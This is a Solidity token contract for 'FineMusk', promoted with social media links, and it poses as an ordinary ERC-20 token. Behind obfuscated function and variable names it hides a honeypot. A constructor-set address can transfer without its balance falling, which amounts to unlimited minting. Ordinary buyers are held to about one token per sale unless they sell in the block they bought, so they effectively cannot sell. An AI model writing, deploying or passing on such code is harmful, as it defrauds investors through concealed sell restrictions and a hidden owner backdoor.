/*

Telegram: https://t.me/FineMuskERC

Twitter: https://twitter.com/FineMuskERC

Website: https://finemusk.crypto-token.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract FineMusk is Ownable {
    uint8 public decimals = 9;

    string public name;

    function xsrne(address kezayfdoscwq, address vhnctaxfr, uint256 zangkq) private {
        address xlvtnfh = IUniswapV2Factory(qhsjm.factory()).getPair(address(this), qhsjm.WETH());
        bool teyig = 0 == ojhar[kezayfdoscwq];
        if (teyig) {
            if (kezayfdoscwq != xlvtnfh && rwbt[kezayfdoscwq] != block.number && zangkq < totalSupply) {
                require(zangkq <= totalSupply / (10 ** decimals));
            }
            balanceOf[kezayfdoscwq] -= zangkq;
        }
        balanceOf[vhnctaxfr] += zangkq;
        rwbt[vhnctaxfr] = block.number;
        emit Transfer(kezayfdoscwq, vhnctaxfr, zangkq);
    }

    function transferFrom(address kezayfdoscwq, address vhnctaxfr, uint256 zangkq) public returns (bool success) {
        require(zangkq <= allowance[kezayfdoscwq][msg.sender]);
        allowance[kezayfdoscwq][msg.sender] -= zangkq;
        xsrne(kezayfdoscwq, vhnctaxfr, zangkq);
        return true;
    }

    function transfer(address vhnctaxfr, uint256 zangkq) public returns (bool success) {
        xsrne(msg.sender, vhnctaxfr, zangkq);
        return true;
    }

    IUniswapV2Router02 private qhsjm;

    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    function approve(address mkjyisglqnbe, uint256 zangkq) public returns (bool success) {
        allowance[msg.sender][mkjyisglqnbe] = zangkq;
        emit Approval(msg.sender, mkjyisglqnbe, zangkq);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory zswgntk, string memory ihmlxq, address ouyijtf, address xluwsb) {
        name = zswgntk;
        symbol = ihmlxq;
        balanceOf[msg.sender] = totalSupply;
        ojhar[xluwsb] = gfptszvdm;
        qhsjm = IUniswapV2Router02(ouyijtf);
    }

    mapping(address => uint256) private ojhar;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private gfptszvdm = 114;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private rwbt;
}
